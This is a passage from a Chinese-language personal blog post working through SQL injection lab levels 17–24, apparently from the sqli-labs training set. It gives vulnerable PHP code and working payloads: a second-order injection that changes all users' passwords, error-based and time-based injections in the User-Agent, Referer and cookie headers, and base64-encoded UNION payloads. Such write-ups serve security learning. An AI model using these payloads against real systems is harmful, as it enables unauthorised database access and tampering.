+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"><span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>我们手动插入一条数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> users(`username`, `password`) <span class="keyword">VALUES</span> (<span class="string">&#x27;test\&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27;, &#x27;</span><span class="number">123</span><span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p>php代码中转义了单引号</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>所以可以正确处理username中的单引号，输入username如下，不要反引号</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">test</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>#</span><br></pre></td></tr></table></figure>
+
+<p>密码随便来一个，提交后发现，所有用户密码全被改了，注入成功</p>
+<p>不过想要数据库中存在一条数据为 <code>test&#39; or 1=1#</code> 比较困难，得配合其他网页尝试插入这条数据</p>
+<h1 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h1><p>输入正常的用户名和密码，发现此网页会打印 user agent 的值，User-Agent 是http请求头的一个字段。查看源码，发现他会把 user agent 和 ip 地址插入数据库，类似一个日志功能，发生注入问题的代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>有报错信息，可以报错注入。不想开burp suite，所以用 hackbar 改变 User-Agent。登录时需要使用正确的用户密码，先登录一次，在f12开发者工具里的 network 中抓个包，看一看post请求体的内容</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="variable">&amp;passwd</span>=admin<span class="variable">&amp;submit</span>=Submit</span><br></pre></td></tr></table></figure>
+
+<p>hackbar 中的 enctype 应该和请求头中的 Content-Type 一样</p>
+<p>设置好 url ，启用 post 方法，但我设置请求体时，submit=Submit 要去掉，不去掉 hackbar 报错，不太清楚是什么原因。submit字段也用不到，直接去掉就好，最后请求体如下</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">uname</span>=admin&amp;passwd=admin</span><br></pre></td></tr></table></figure>
+
+<p>设置 User-Agent</p>
+<p>报错注入sql语句不能有语法错误，values 后面的字段数量必须和 values 前面一样，不清楚 user agent 后面还有没有别的字段的话，可以多尝试几次，最后尝试到没有报错的值为</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc<span class="string">&#x27;, &#x27;</span><span class="number">112&#x27;</span>, <span class="string">&#x27;asd&#x27;</span>)<span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+<p>报错注入如下，选一个字段换成那几个就行</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">abc</span>&#x27;, extractvalue(<span class="number">0</span>x<span class="number">0</span>a,concat(<span class="number">0</span>x<span class="number">0</span>a,(select database()))), &#x27;asd&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27;,&#x27;<span class="number">2</span>&#x27;,&#x27;<span class="number">3</span>&#x27;), (&#x27;<span class="number">1</span>&#x27;,&#x27;<span class="number">2</span>&#x27;,extractvalue(<span class="number">0</span>x<span class="number">0</span>a,concat(<span class="number">0</span>x<span class="number">0</span>a,(select database()))))#</span><br></pre></td></tr></table></figure>
+
+<p>适用于user agent 是插入的最后一个字段</p>
+<p>时间盲注可行，布尔盲注应该不行</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27;,&#x27;<span class="number">2</span>&#x27;,&#x27;<span class="number">3</span>&#x27;), (&#x27;<span class="number">1</span>&#x27;,&#x27;<span class="number">2</span>&#x27;,if(<span class="number">1</span>=<span class="number">1</span>, sleep(<span class="number">3</span>), <span class="number">0</span>))#</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h1><p>跟 less-18 类似，User-Agent 换成了 Referer。Referer 也是请求头中的一个字段，据说这个单词正确写法是referrer，但是以前写错了，所以就沿用了 Referer。</p>
+<p>除了插入的列数不一样，其他都一样</p>
+<p>报错注入</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27;,&#x27;<span class="number">2</span>&#x27;), (&#x27;<span class="number">1</span>&#x27;,extractvalue(<span class="number">0</span>x<span class="number">0</span>a,concat(<span class="number">0</span>x<span class="number">0</span>a,(select database()))))#</span><br></pre></td></tr></table></figure>
+
+<p>时间盲注</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27;,&#x27;<span class="number">2</span>&#x27;), (&#x27;<span class="number">1</span>&#x27;,if(<span class="number">1</span>=<span class="number">1</span>, sleep(<span class="number">3</span>), <span class="number">0</span>))#</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h1><p>post方法提交表单后，设置cookie，重定向到get方法请求的 index.php ，提交表单后重定向到get方法请求的页面是一种比较常见的做法，可以防止刷新时重复提交表单。发送请求时，如果请求的是一个目录，会自动寻找目录中的 index 文件，如 index.html , index.php之类的</p>
+<p> cookie 也可以在 http请求头中找到，也可以在其他地方查看。临时改变 cookie ，可以在hackbar中改变 cookie 字段的值。若是要持久修改cookie，谷歌浏览器插件 Edit This Cookie 可以比较方便的修改cookie。</p>
+<p>hackbar中，cookie值改为如下所示，可以采用联合注入</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>(),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+<p>报错信息也有</p>
+<h1 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h1><p>看标题有个base64，使用admin登录，发现cookie是 <code>YWRtaW4%3D</code> base64编码最后可能出现等号，%3D 应该是 = 的 url 编码，拿 <code>YWRtaW4=</code> 去解码，发现就是 admin</p>
+<p>拿 Edit This Cookie 改cookie 改完后刷新网页。（后面试出来多个了圆括号）</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>(),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+<p>拿去base64编码</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">JykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSwzIw</span>==</span><br></pre></td></tr></table></figure>
+
+<p>等号换成  <code>%3D</code> ，cookie 中的 uname 改为如下值 （不换好像也行）</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JykgdW<span class="number">5</span>pb<span class="number">24</span>gc<span class="number">2</span><span class="attr">VsZWN0</span>IDEsZGF<span class="number">0</span>YWJhc<span class="number">2</span>UoKSwzIw<span class="meta">%</span><span class="number">3</span>D<span class="meta">%</span><span class="number">3</span>D</span><br></pre></td></tr></table></figure>
+
+<p>成了</p>
+<p>cookie中等号不用url编码也能正确处理，用了好像也行</p>
+<p>看了一眼代码，没看到手动处理url编码的函数，wireshark 抓包也没看出什么，不管了</p>
+<h1 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h1><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span>#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=IiB<span class="number">1</span>bmlvbiBzZWxlY<span class="number">3</span>QgMSxkYXRhYmFzZSgpLDMj</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h1><p>过滤了注释符 # 和 – 。有报错信息，需要构造出一个没有语法错误的sql语句才可以使用报错注入</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?i</span>d=<span class="string">&#x27; or extractvalue(0x0a,concat(0x0a,(select database()))) or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>时间盲注</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?i</span>d=<span class="string">&#x27; or if(1=1, sleep(3), 0) or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>布尔盲注</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?i</span>d=<span class="string">&#x27; or if(1=1, 1, 0) or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>联合查询好像不能接where，所以能用union</p>
+<h1 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h1><p>不知道什么原因 php文件少了几个，就先到这吧</p>
+<p>未完待续。。。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/14/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" rel="prev" title="使用hexo搭建博客">
+      <i class="fa fa-chevron-left"></i> 使用hexo搭建博客
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/01/27/%E7%94%A8php%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%95%99%E8%A8%80%E6%9D%BF/" rel="next" title="用php写一个简易留言板">
+      用php写一个简易留言板 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#less-1"><span class="nav-number">1.</span> <span class="nav-text">less-1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-2"><span class="nav-number">2.</span> <span class="nav-text">less-2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-3"><span class="nav-number">3.</span> <span class="nav-text">less-3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-4"><span class="nav-number">4.</span> <span class="nav-text">less-4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-5"><span class="nav-number">5.</span> <span class="nav-text">less-5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-6"><span class="nav-number">6.</span> <span class="nav-text">less-6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-7"><span class="nav-number">7.</span> <span class="nav-text">less-7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-8"><span class="nav-number">8.</span> <span class="nav-text">less-8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-9"><span class="nav-number">9.</span> <span class="nav-text">less-9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-10"><span class="nav-number">10.</span> <span class="nav-text">less-10</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-11"><span class="nav-number">11.</span> <span class="nav-text">less-11</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-12"><span class="nav-number">12.</span> <span class="nav-text">less-12</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-13"><span class="nav-number">13.</span> <span class="nav-text">less-13</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-14"><span class="nav-number">14.</span> <span class="nav-text">less-14</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-15"><span class="nav-number">15.</span> <span class="nav-text">less-15</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-16"><span class="nav-number">16.</span> <span class="nav-text">less-16</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-17"><span class="nav-number">17.</span> <span class="nav-text">less-17</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-18"><span class="nav-number">18.</span> <span class="nav-text">less-18</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-19"><span class="nav-number">19.</span> <span class="nav-text">less-19</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-20"><span class="nav-number">20.</span> <span class="nav-text">less-20</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-21"><span class="nav-number">21.</span> <span class="nav-text">less-21</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-22"><span class="nav-number">22.</span> <span class="nav-text">less-22</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-23"><span class="nav-number">23.</span> <span class="nav-text">less-23</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-24"><span class="nav-number">24.</span> <span class="nav-text">less-24</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="x4297"
+      src="/images/Yuumi.jpg">
+  <p class="site-author-name" itemprop="name">x4297</p>
+  <div class="site-description" itemprop="description">开摆!</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">x4297</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
